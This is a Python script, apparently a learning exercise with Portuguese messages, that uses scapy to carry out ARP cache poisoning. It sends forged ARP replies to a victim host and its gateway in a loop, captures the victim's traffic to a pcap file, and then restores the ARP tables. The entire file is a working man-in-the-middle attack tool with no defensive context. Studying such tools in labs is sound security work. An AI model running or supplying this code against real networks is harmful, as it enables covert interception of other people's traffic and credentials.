from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

def poison(victim, victimmac, gateway, gatewaymac):
    poison_victim = ARP()
    poison_victim.op = 2
    poison_victim.psrc = gateway
    poison_victim.pdst = victim
    poison_victim.hwdst = victimmac
    print(f'IP de origem: {poison_victim.psrc}')
    print(f'IP de destino: {poison_victim.pdst}')
    print(f'MAC de destino: {poison_victim.hwdst}')
    print(f'MAC de origem: {poison_victim.hwsrc}')
    print(poison_victim.summary())
    print('-'*30)
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = victim
    poison_gateway.pdst = gateway
    poison_gateway.hwdst = gatewaymac
    
    print(f'IP de origem: {poison_gateway.psrc}')
    print(f'IP de destino: {poison_gateway.pdst}')
    print(f'MAC de destino: {poison_gateway.hwdst}')
    print(f'MAC de origem: {poison_gateway.hwsrc}')
    print(poison_victim.summary())
    print('-'*30)
    print(f'Iniciando o envenenamento ARP. [CTRL-C para interromper]')
    while True:
        sys.stdout.write('.')
        sys.stdout.flush()
        try:
            send(poison_victim)
            send(poison_gateway)
        except KeyboardInterrupt:
            restore(victim, victimmac, gateway, gatewaymac)
            sys.exit()
        else:
            time.sleep(2)

def sniff_packets(interface, victim, gateway ,count=100):
    print(f'Capturando {count} pacotes')
    bpf_filter = "ip host %s" % victim
    packets = sniff(count=count, filter=bpf_filter, iface=interface)
    wrpcap('arper.pcap', packets)
    print('Pacote recebidos')
    restore(victim, get_mac(victim), gateway, get_mac(gateway))
    print('Concluído')

def restore(victim, victimmac, gateway, gatewaymac):
    print('Restaurando tabelas ARP....')
    send(ARP(
        op=2,
        psrc=gateway,
        hwsrc=gatewaymac,
        pdst=victim,
        hwdst='ff:ff:ff:ff:ff:ff'), count=5)
    send(ARP(
        op=2,
        psrc=victim,
        hwsrc=victimmac,
        pdst=gateway,
        hwdst='ff:ff:ff:ff:ff:ff'), count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    victimmac = get_mac(victim)
    gatewaymac = get_mac(gateway)
    conf.iface = interface
    conf.verb = 0
    
    print(f'{interface} inicializada')
    print(f'Gateway ({gateway}) está em {gatewaymac}')
    print(f'Vítima ({victim}) está em {victimmac}')
    print('-'*30)
    
    poison_thread = Process(target=poison, args=(victim, victimmac, gateway, gatewaymac))
    poison_thread.start()
    
    sniff_thread = Process(target=sniff_packets, args=(interface, victim, gateway))
    sniff_thread.start()